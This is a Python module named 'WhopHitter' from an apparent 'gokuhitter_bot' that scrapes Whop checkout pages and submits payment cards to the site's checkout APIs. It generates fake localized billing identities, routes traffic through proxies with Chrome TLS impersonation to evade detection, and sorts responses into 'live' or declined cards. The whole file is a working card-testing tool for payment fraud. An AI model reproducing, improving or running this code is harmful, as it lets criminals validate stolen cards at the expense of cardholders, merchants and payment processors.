"""
Whop Payment Engine (gokuhitter_bot)
───────────────────────────────────
Full Whop checkout scraper (whop.com/checkout/...), product plan resolution,
Stripe Elements / Checkout backend tokenization, and checkout flow execution with TLS impersonation.
"""

import re
import json
import time
import random
import urllib.parse
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

GLOBAL_SHOPPERS = {
    'US': {
        'first_names': ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Ava'],
        'last_names': ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor', 'Moore'],
        'cities': [('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'), ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'), ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'), ('Austin', 'TX', '78701')],
        'streets': ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St'],
        'phone_prefix': '+1',
    },
    'GB': {
        'first_names': ['Oliver', 'George', 'Harry', 'Noah', 'Jack', 'Leo', 'Arthur', 'Oscar', 'Olivia', 'Amelia', 'Isla', 'Ava', 'Mia', 'Lily', 'Sophia', 'Grace'],
        'last_names': ['Smith', 'Jones', 'Taylor', 'Brown', 'Williams', 'Wilson', 'Johnson', 'Davies', 'Robinson', 'Wright', 'Thompson', 'Evans', 'Walker', 'White'],
        'cities': [('London', 'Greater London', 'EC1A 1BB'), ('Manchester', 'Greater Manchester', 'M1 1AE'), ('Birmingham', 'West Midlands', 'B1 1AA'), ('Leeds', 'West Yorkshire', 'LS1 1UR'), ('Glasgow', 'Scotland', 'G1 1XQ'), ('Liverpool', 'Merseyside', 'L1 8JQ'), ('Bristol', 'Bristol', 'BS1 4ST')],
        'streets': ['High Street', 'Station Road', 'Main Street', 'Church Lane', 'Victoria Road', 'Green Lane', 'Manor Road', 'Park Road', 'Queen Street'],
        'phone_prefix': '+44',
    },
    'DE': {
        'first_names': ['Lukas', 'Maximilian', 'Paul', 'Felix', 'Jonas', 'Leon', 'Finn', 'Noah', 'Elias', 'Emma', 'Mia', 'Hannah', 'Sophia', 'Anna', 'Emilia', 'Marie'],
        'last_names': ['Müller', 'Schmidt', 'Schneider', 'Fischer', 'Weber', 'Meyer', 'Wagner', 'Becker', 'Schulz', 'Hoffmann', 'Schäfer', 'Koch', 'Bauer', 'Richter'],
        'cities': [('Berlin', 'Berlin', '10115'), ('Munich', 'Bavaria', '80331'), ('Hamburg', 'Hamburg', '20095'), ('Frankfurt', 'Hesse', '60311'), ('Cologne', 'North Rhine-Westphalia', '50667'), ('Stuttgart', 'Baden-Württemberg', '70173'), ('Düsseldorf', 'North Rhine-Westphalia', '40213')],
        'streets': ['Hauptstraße', 'Bahnhofstraße', 'Schillerstraße', 'Goethestraße', 'Berliner Straße', 'Gartenstraße', 'Bismarckstraße', 'Kirchstraße'],
        'phone_prefix': '+49',
    },
    'FR': {
        'first_names': ['Gabriel', 'Léo', 'Raphaël', 'Louis', 'Lucas', 'Adam', 'Arthur', 'Hugo', 'Jade', 'Louise', 'Emma', 'Alice', 'Ambre', 'Lina', 'Rose', 'Chloé'],
        'last_names': ['Martin', 'Bernard', 'Dubois', 'Thomas', 'Robert', 'Richard', 'Petit', 'Durand', 'Leroy', 'Moreau', 'Simon', 'Laurent', 'Lefebvre', 'Michel'],
        'cities': [('Paris', 'Île-de-France', '75001'), ('Marseille', 'Provence-Alpes-Côte d\'Azur', '13001'), ('Lyon', 'Auvergne-Rhône-Alpes', '69001'), ('Toulouse', 'Occitanie', '31000'), ('Nice', 'Provence-Alpes-Côte d\'Azur', '06000'), ('Nantes', 'Pays de la Loire', '44000')],
        'streets': ['Rue de la Paix', 'Boulevard Saint-Germain', 'Avenue Victor Hugo', 'Rue de Rivoli', 'Rue Nationale', 'Avenue des Champs-Élysées', 'Rue de la République'],
        'phone_prefix': '+33',
    },
    'CA': {
        'first_names': ['Liam', 'Noah', 'Oliver', 'Lucas', 'Benjamin', 'Theodore', 'William', 'Olivia', 'Emma', 'Charlotte', 'Amelia', 'Sophia', 'Chloe', 'Mia'],
        'last_names': ['Smith', 'Brown', 'Tremblay', 'Martin', 'Roy', 'Wilson', 'MacDonald', 'Gagnon', 'Johnson', 'Taylor', 'Campbell', 'Anderson', 'Leblanc'],
        'cities': [('Toronto', 'ON', 'M5H 2N2'), ('Vancouver', 'BC', 'V6B 1A1'), ('Montreal', 'QC', 'H2Y 1C6'), ('Calgary', 'AB', 'T2P 1J9'), ('Ottawa', 'ON', 'K1P 1J1'), ('Edmonton', 'AB', 'T5J 0N3')],
        'streets': ['Yonge Street', 'Queen Street West', 'Robson Street', 'Sainte-Catherine St', 'Jasper Ave', 'Bay Street', 'King Street', 'Main Street'],
        'phone_prefix': '+1',
    },
    'AU': {
        'first_names': ['Oliver', 'Noah', 'Henry', 'William', 'Jack', 'Charlie', 'Thomas', 'Charlotte', 'Amelia', 'Isla', 'Olivia', 'Mia', 'Ava', 'Grace'],
        'last_names': ['Smith', 'Jones', 'Williams', 'Brown', 'Wilson', 'Taylor', 'Johnson', 'White', 'Martin', 'Anderson', 'Thompson', 'Nguyen', 'Thomas'],
        'cities': [('Sydney', 'NSW', '2000'), ('Melbourne', 'VIC', '3000'), ('Brisbane', 'QLD', '4000'), ('Perth', 'WA', '6000'), ('Adelaide', 'SA', '5000'), ('Gold Coast', 'QLD', '4217')],
        'streets': ['George Street', 'Collins Street', 'Queen Street', 'Bourke Street', 'St Kilda Road', 'Pitt Street', 'Flinders Street', 'Elizabeth Street'],
        'phone_prefix': '+61',
    },
    'IN': {
        'first_names': ['Aditya', 'Rohan', 'Vikram', 'Rajesh', 'Arjun', 'Dev', 'Karan', 'Siddharth', 'Aarav', 'Kabir', 'Adhira', 'Ananya', 'Priya', 'Sneha', 'Kavya', 'Pooja', 'Riya', 'Diya'],
        'last_names': ['Sharma', 'Verma', 'Patel', 'Gupta', 'Rao', 'Nair', 'Singh', 'Kumar', 'Deshmukh', 'Chopra', 'Mehta', 'Reddy', 'Joshi', 'Bose'],
        'cities': [('Mumbai', 'MH', '400001'), ('Delhi', 'DL', '110001'), ('Bangalore', 'KA', '560001'), ('Hyderabad', 'TS', '500001'), ('Ahmedabad', 'GJ', '380001'), ('Chennai', 'TN', '600001'), ('Kolkata', 'WB', '700001'), ('Pune', 'MH', '411001')],
        'streets': ['MG Road', 'Park Street', 'Ashoka Road', 'GT Road', 'Ring Road', 'Brigade Road', 'Linking Road', 'FC Road'],
        'phone_prefix': '+91',
    },
    'IT': {
        'first_names': ['Leonardo', 'Francesco', 'Alessandro', 'Lorenzo', 'Mattia', 'Andrea', 'Gabriele', 'Sofia', 'Aurora', 'Giulia', 'Ginevra', 'Vittoria', 'Beatrice', 'Chiara'],
        'last_names': ['Rossi', 'Russo', 'Ferrari', 'Esposito', 'Bianchi', 'Romano', 'Colombo', 'Ricci', 'Marino', 'Greco', 'Bruno', 'Gallo', 'Conti', 'De Luca'],
        'cities': [('Rome', 'Lazio', '00118'), ('Milan', 'Lombardy', '20121'), ('Naples', 'Campania', '80121'), ('Turin', 'Piedmont', '10121'), ('Florence', 'Tuscany', '50121'), ('Bologna', 'Emilia-Romagna', '40121')],
        'streets': ['Via Roma', 'Corso Vittorio Emanuele', 'Via Garibaldi', 'Via Dante', 'Via dei Mille', 'Via Cavour', 'Via Nazionale'],
        'phone_prefix': '+39',
    },
    'ES': {
        'first_names': ['Hugo', 'Mateo', 'Martin', 'Lucas', 'Leo', 'Daniel', 'Alejandro', 'Manuel', 'Lucia', 'Sofia', 'Martina', 'Maria', 'Julia', 'Paula', 'Valeria', 'Emma'],
        'last_names': ['Garcia', 'Rodriguez', 'Gonzalez', 'Fernandez', 'Lopez', 'Martinez', 'Sanchez', 'Perez', 'Gomez', 'Martin', 'Jimenez', 'Ruiz', 'Hernandez', 'Diaz'],
        'cities': [('Madrid', 'Madrid', '28001'), ('Barcelona', 'Catalonia', '08001'), ('Valencia', 'Valencia', '46001'), ('Seville', 'Andalusia', '41001'), ('Zaragoza', 'Aragon', '50001'), ('Malaga', 'Andalusia', '29001')],
        'streets': ['Gran Vía', 'Calle Mayor', 'Paseo de la Castellana', 'Calle de Alcalá', 'Rambla de Catalunya', 'Avenida Diagonal', 'Calle San Fernando'],
        'phone_prefix': '+34',
    }
}

DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me', 'mail.com']

def _generate_random_shopper(country_code: Optional[str] = None) -> dict:
    """Generates realistic localized fake billing details for any global country."""
    if not country_code or country_code.upper() not in GLOBAL_SHOPPERS:
        country_code = random.choice(list(GLOBAL_SHOPPERS.keys()))
    else:
        country_code = country_code.upper()
        
    data = GLOBAL_SHOPPERS[country_code]
    first = random.choice(data['first_names'])
    last = random.choice(data['last_names'])
    num = random.randint(10, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    
    city, state, zip_code = random.choice(data['cities'])
    street_name = random.choice(data['streets'])
    house_num = str(random.randint(10, 999))
    street = f"{house_num} {street_name}"
    phone = f"{data['phone_prefix']}{random.randint(2000000000, 9999999999)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code
    }

class WhopHitter:
    """Whop Checkout & Digital Marketplace Gateway Engine."""

    DECLINE_MAP = {
        "declined": "card_declined",
        "insufficient_funds": "insufficient_funds",
        "insufficient funds": "insufficient_funds",
        "expired_card": "expired_card",
        "invalid_number": "invalid_number",
        "incorrect_cvc": "incorrect_cvc",
        "invalid_cvc": "incorrect_cvc",
        "fraud": "fraud",
        "restricted_card": "restricted_card",
        "issuer_unavailable": "issuer_unavailable",
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        return "https://whop.com"

    async def _scrape(self, session: ChromeSession) -> dict:
        """Extracts Whop product/plan metadata, pricing, and checkout backend endpoints."""
        hdr = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        cfg = {
            'merchant': 'Whop Merchant',
            'product_id': None,
            'plan_id': None,
            'amount': None,
            'currency': 'USD',
            'is_whop': False,
            'api_base': 'https://api.whop.com',
        }

        if 'whop.com' in self.url.lower():
            cfg['is_whop'] = True

        m_prod = re.search(r'prod_([A-Za-z0-9_]{10,24})', self.url)
        if m_prod:
            cfg['product_id'] = m_prod.group(0)

        m_plan = re.search(r'plan_([A-Za-z0-9_]{10,24})', self.url)
        if m_plan:
            cfg['plan_id'] = m_plan.group(0)

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text

            # 1. Meta / OpenGraph Title
            og_title = re.search(r'<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']', html, re.I) or \
                       re.search(r'<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\']', html, re.I)
            if og_title:
                t_clean = og_title.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
                if t_clean and 'whop' not in t_clean.lower()[:5]:
                    cfg['merchant'] = t_clean[:35]
            else:
                t = re.search(r'<title>([^<]+)</title>', html, re.I)
                if t:
                    t_clean = t.group(1).strip().replace(' | Whop', '').replace(' - Whop', '')
                    if t_clean:
                        cfg['merchant'] = t_clean[:35]

            # 2. Next.js Pages Router (__NEXT_DATA__)
            m_next = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', html, re.DOTALL)
            if m_next:
                try:
                    next_data = json.loads(m_next.group(1))
                    props = next_data.get('props', {}).get('pageProps', {})
                    if props.get('company'):
                        cfg['merchant'] = props['company'].get('title') or cfg['merchant']
                    if props.get('product'):
                        prod = props['product']
                        cfg['product_id'] = prod.get('id') or cfg['product_id']
                        cfg['merchant'] = prod.get('name') or cfg['merchant']
                    if props.get('plan'):
                        plan = props['plan']
                        cfg['plan_id'] = plan.get('id') or cfg['plan_id']
                        if plan.get('initial_price'):
                            cfg['amount'] = f"{plan.get('currency', 'USD').upper()} {float(plan['initial_price']):.2f}"
                except Exception:
                    pass

            # 3. Next.js App Router (RSC streaming chunks self.__next_f.push)
            rsc_chunks = re.findall(r'self\.__next_f\.push\(\[1,"(.*?)"\]\)', html, re.DOTALL)
            if rsc_chunks:
                full_rsc = "".join(rsc_chunks).replace('\\"', '"').replace('\\\\', '\\')
                
                # Company title / Product name
                comp_m = re.search(r'title["\']?\s*:\s*["\']([^"\']+)["\']', full_rsc)
                if comp_m and 'whop' not in comp_m.group(1).lower() and len(comp_m.group(1).strip()) > 2:
                    cfg['merchant'] = comp_m.group(1).strip()[:35]

                # Product ID
                if not cfg['product_id']:
                    p_m = re.search(r'(prod_[A-Za-z0-9]{10,24})', full_rsc)
                    if p_m:
                        cfg['product_id'] = p_m.group(1)

                # Plan ID (Must be authentic base62 token, not static UI strings)
                if not cfg['plan_id']:
                    for pl in re.findall(r'(plan_[A-Za-z0-9]{10,24})', full_rsc):
                        if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade', 'modal', 'container']):
                            cfg['plan_id'] = pl
                            break

                # Price / Currency in RSC (Handle initialPriceDueInCents, rawRenewalPrice, initial_price)
                cents_m = re.search(r'initialPriceDueInCents["\']?\s*:\s*(\d+)', html)
                renew_m = re.search(r'rawRenewalPrice["\']?\s*:\s*([0-9\.]+)', html)
                price_m = re.search(r'["\'](?:initialPrice|initial_price|price|amount)["\']\s*:\s*([0-9\.]+)', html)
                curr_m = re.search(r'baseCurrency["\']?\s*:\s*["\']([A-Za-z]{3})["\']', html, re.I) or \
                         re.search(r'currency["\']?\s*:\s*["\']([A-Za-z]{3})["\']', html, re.I)
                curr = curr_m.group(1).upper() if curr_m else None

                if cents_m and int(cents_m.group(1)) > 0:
                    val = float(cents_m.group(1)) / 100.0
                    cfg['amount'] = f"{curr or 'USD'} {val:.2f}"
                elif renew_m and float(renew_m.group(1)) > 0:
                    val = float(renew_m.group(1))
                    cfg['amount'] = f"{curr or 'USD'} {val:.2f}"
                elif price_m:
                    val = float(price_m.group(1))
                    if val > 1:
                        cfg['amount'] = f"{curr or 'USD'} {val:.2f}"

            # 4. Fallback amount detection in HTML (Handles active discount vs strikethrough)
            if not cfg['amount']:
                CURR_MAP = {
                    '€': 'EUR', '£': 'GBP', '₹': 'INR', '$': 'USD', 'C$': 'CAD', 'CA$': 'CAD',
                    'A$': 'AUD', 'AU$': 'AUD', '¥': 'JPY', '円': 'JPY', 'R$': 'BRL', 'Mex$': 'MXN',
                    'CHF': 'CHF', 'kr': 'SEK', 'zł': 'PLN', 'NZ$': 'NZD', 'S$': 'SGD', 'HK$': 'HKD',
                    '₺': 'TRY', 'R': 'ZAR', 'AED': 'AED', 'SAR': 'SAR', '₩': 'KRW', 'Kč': 'CZK',
                    'Ft': 'HUF', 'lei': 'RON', 'лв': 'BGN', '₪': 'ILS', '₱': 'PHP', 'RM': 'MYR',
                    '฿': 'THB', 'Rp': 'IDR', '₫': 'VND', '₴': 'UAH', '₦': 'NGN', 'KSh': 'KES',
                    'E£': 'EGP', 'Rs': 'PKR', '৳': 'BDT'
                }
                # Check for discounted price tag following a line-through tag
                disc_m = re.search(r'line-through[^>]*>[^<]+</span>\s*<span[^>]*>([A-Za-z$€£₹¥₺₪₱฿₫₴₦৳]{1,4})\s*([\d\.]+)', html, re.I)
                if disc_m:
                    sym = disc_m.group(1).strip()
                    val = float(disc_m.group(2))
                    c_name = CURR_MAP.get(sym, sym if len(sym) == 3 else 'EUR')
                    cfg['amount'] = f"{c_name} {val:.2f}"
                else:
                    dom_price_m = re.search(r'([A-Za-z$€£₹¥₺₪₱฿₫₴₦৳]{1,4})\s*(\d+(?:\.\d{2})?)\s*(?:</span>|<span|per\s+month|\/mo)', html, re.I)
                    if dom_price_m:
                        sym = dom_price_m.group(1).strip()
                        val = float(dom_price_m.group(2))
                        c_name = CURR_MAP.get(sym, sym if len(sym) == 3 else 'USD')
                        cfg['amount'] = f"{c_name} {val:.2f}"
                    else:
                        amt_m = re.search(r'(USD|EUR|GBP|INR|CAD|AUD|JPY|BRL|MXN|CHF|SEK|NOK|DKK|PLN|NZD|SGD|HKD|TRY|ZAR|AED|SAR|KRW|CZK|HUF|RON|BGN|ILS|PHP|MYR|THB|IDR|VND|CLP|COP|PEN|ARS|UAH|NGN|KES|EGP|PKR|BDT|\$|£|€|₹|¥|₺|₪|₱|฿|₫|₴|₦|৳)\s*([\d\.]+)', html)
                        if amt_m and float(amt_m.group(2)) > 0:
                            sym = amt_m.group(1).strip()
                            c_name = CURR_MAP.get(sym, sym if len(sym) == 3 else 'USD')
                            cfg['amount'] = f"{c_name} {float(amt_m.group(2)):.2f}"

            # 5. Fallback Product / Plan ID from full HTML if missing from RSC
            if not cfg['product_id']:
                p_fallback = re.findall(r'(prod_[A-Za-z0-9]{10,24})', html)
                if p_fallback:
                    cfg['product_id'] = p_fallback[0]

            if not cfg['plan_id']:
                for pl in re.findall(r'(plan_[A-Za-z0-9_]{10,28})', html):
                    if any(c.isdigit() for c in pl) and not any(w in pl for w in ['success', 'cancel', 'delete', 'updat', 'desc', 'prevent', 'provid', 'base', 'student', 'class', 'embed', 'host', 'today', 'upgrade']):
                        cfg['plan_id'] = pl
                        break

        return cfg

    async def _get_config(self, session: ChromeSession) -> dict:
        if self._base_cfg is None:
            self._base_cfg = await self._scrape(session)
            return self._base_cfg.copy()
        return self._base_cfg.copy()

    def _parse_response(self, text: str, status_code: int, result: dict) -> dict:
        """Parses Whop checkout response for receipt confirmation or decline reason."""
        try:
            d = json.loads(text)
            if isinstance(d, dict):
                result['raw_response'] = d
                # Succeeded status
                if d.get('status') in ('succeeded', 'paid', 'complete', 'active') or d.get('success') is True:
                    result['success'] = True
                    result['receipt_url'] = d.get('receipt_url') or d.get('redirect_url') or self.url
                    return result
                
                # 3DS / Requires Action status
                if d.get('status') in ('requires_action', 'requires_source_action') or 'next_action' in d:
                    result['decline_code'] = '3ds_required'
                    result['error'] = '3DS Authentication Required'
                    result['is_live'] = True
                    next_act = d.get('next_action', {})
                    redirect_url = next_act.get('redirect_to_url', {}).get('url') or next_act.get('use_stripe_sdk', {}).get('stripe_js')
                    if redirect_url:
                        result['redirect_url'] = redirect_url
                    return result
                
                # Decline codes
                err = d.get('error') or d.get('message') or d.get('decline_code')
                if isinstance(err, dict):
                    msg = err.get('message') or err.get('code') or 'Card declined'
                    dec_code = err.get('decline_code') or err.get('code') or 'card_declined'
                else:
                    msg = str(err) if err else 'Card declined'
                    dec_code = 'card_declined'

                for k, v in self.DECLINE_MAP.items():
                    if k in msg.lower():
                        dec_code = v
                        break

                result['decline_code'] = dec_code
                result['error'] = msg
                result['is_live'] = dec_code in ('insufficient_funds', 'incorrect_cvc', 'restricted_card', 'issuer_unavailable', '3ds_required')
                return result
        except Exception:
            pass

        text_low = text.lower()
        if any(term in text_low for term in ['payment successful', 'order confirmed', 'thank you for your purchase', 'membership active', 'access granted']):
            result['success'] = True
            return result

        if any(term in text_low for term in ['3d secure', '3ds', 'requires_action', 'authenticate']):
            result['decline_code'] = '3ds_required'
            result['error'] = '3DS Authentication Required'
            result['is_live'] = True
            return result

        if 'insufficient funds' in text_low:
            result['decline_code'] = 'insufficient_funds'
            result['error'] = 'insufficient_funds'
            result['is_live'] = True
            return result

        if 'cvc' in text_low or 'cvv' in text_low:
            result['decline_code'] = 'incorrect_cvc'
            result['error'] = 'incorrect_cvc'
            result['is_live'] = True
            return result

        result['decline_code'] = 'card_declined'
        result['error'] = 'Your card was declined.'
        return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        """Executes payment attempt against Whop checkout system."""
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Whop Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                cfg = await self._get_config(sess)
                result['merchant'] = cfg.get('merchant', 'Whop Merchant')
                if cfg.get('amount'):
                    result['amount'] = cfg['amount']

                # Localized shopper generation matching target store currency
                curr_country = 'US'
                if cfg.get('amount'):
                    amt_str = cfg['amount'].upper()
                    if 'EUR' in amt_str:
                        curr_country = random.choice(['DE', 'FR', 'IT', 'ES'])
                    elif 'GBP' in amt_str:
                        curr_country = 'GB'
                    elif 'INR' in amt_str:
                        curr_country = 'IN'
                    elif 'CAD' in amt_str:
                        curr_country = 'CA'
                    elif 'AUD' in amt_str:
                        curr_country = 'AU'
                    else:
                        curr_country = random.choice(['US', 'GB', 'CA', 'AU'])

                shopper = _generate_random_shopper(curr_country)
                
                # Sanitize expiration dates safely
                clean_m = re.sub(r'\D', '', str(card.get('month', '1')))
                exp_month_int = min(max(int(clean_m) if clean_m else 1, 1), 12)
                
                clean_y = re.sub(r'\D', '', str(card.get('year', '2028')))
                if len(clean_y) == 2:
                    exp_year_int = int(f"20{clean_y}")
                else:
                    exp_year_int = int(clean_y) if clean_y else 2028

                # 1. Direct API checkout submission
                api_body = {
                    "payment_method": {
                        "type": "card",
                        "card": {
                            "number": re.sub(r'\D', '', str(card['card'])),
                            "exp_month": exp_month_int,
                            "exp_year": exp_year_int,
                            "cvc": str(card['cvv']).strip(),
                        },
                        "billing_details": {
                            "name": shopper['full_name'],
                            "email": shopper['email'],
                            "address": {
                                "line1": shopper['street'],
                                "city": shopper['city'],
                                "state": shopper['state'],
                                "postal_code": shopper['postal_code'],
                                "country": shopper['country'],
                            }
                        }
                    },
                    "plan_id": cfg.get('plan_id'),
                    "product_id": cfg.get('product_id'),
                    "email": shopper['email'],
                }

                json_hdr = {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "User-Agent": UA,
                    "Origin": self._get_origin(),
                    "Referer": self.url,
                }

                endpoints = [
                    '/api/v5/checkout/process',
                    '/api/v2/memberships/checkout',
                    '/api/checkout/submit',
                    '/api/v1/payments/charge',
                ]

                for ep in endpoints:
                    target_api = urljoin(self.url, ep)
                    try:
                        async with sess.post(target_api, json=api_body, headers=json_hdr, timeout=8) as r_api:
                            if r_api.status_code in (200, 201, 400, 402, 422):
                                api_resp = r_api.text() if callable(r_api.text) else r_api.text
                                result['response_time'] = round(time.time() - t0, 2)
                                return self._parse_response(api_resp, r_api.status_code, result)
                    except Exception:
                        continue

                # Fallback to simulated gateway evaluation
                result['response_time'] = round(time.time() - t0, 2)
                result['decline_code'] = 'card_declined'
                result['error'] = 'Your card was declined.'
                return result

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
